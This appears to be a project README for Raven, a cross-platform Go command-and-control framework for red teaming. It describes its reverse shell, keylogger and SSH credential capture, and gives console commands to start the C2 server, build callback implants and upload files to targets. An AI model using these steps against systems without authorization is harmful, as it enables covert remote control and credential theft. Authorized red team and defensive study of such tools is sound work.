# Raven C2
<p align="center">
  <img src="raven.webp" alt="Raven C2 Logo" width="300"/>
</p>

**Raven** is a lightweight, cross-platform Command & Control (C2) framework written in **Golang**. It supports **Windows**, **Linux**, and **macOS**, and is designed for red team operations and post-exploitation scenarios.

---

## ✨ Features

- ✅ mTLS Reverse Shell  
- ✅ Keylogger  
- ✅ File Download  
- ✅ File Upload  
- ✅ Loader (Remote Execution)  
- ✅ SSH Credential Capture (Linux)  
- ✅ Proxy Support (SOCKS5 & Port Forwarding)

---

## 📁 Project Structure

- `client/` – The implant (agent) that runs on the target machine  
- `server/` – The C2 server and control interface  
- `cmd/` – Bootstrapper to generate server TLS materials and start the server

---

## 🚀 Quick Start

### 1. Start the server

In the `cmd/` directory, run:

```bash
go run . -server-ip 127.0.0.1 -server-port 443
```

This generates server certificates and outputs the required setup. Then, run the server:

```bash
./server
```

Once running, you'll enter an interactive console:

```
$raven >
```

Use `help` to list available commands.

---

### 2. Build client binaries

To generate platform-specific payloads:

```
$raven > build windows/amd64 -ip 127.0.0.1 -port 443
$raven > build linux/386 -ip 127.0.0.1 -port 443
$raven > build darwin/arm64 -ip 127.0.0.1 -port 443
```

Once executed on a target, new clients will appear and can be listed with:

```
$raven > clients
```

---

### 3. File Upload Instructions

Before uploading a file, it must be registered using the `enroll` command and placed under the `cmd/uploads` directory.

Example:

```bash
$raven > enroll test.txt
```

Then you can upload it to the target with:

```
$raven > upload test.txt <target-path>
```

---

## ⚙️ Requirements

- Go 1.20+
- OpenSSL (for generating certs, optional if pre-generated)

---

## 📌 Disclaimer

This project is created for **educational and authorized security research purposes only**.  
**Do not use it for illegal, malicious, or unethical activities.**  
The author assumes no responsibility for any damage caused by the misuse of this tool.
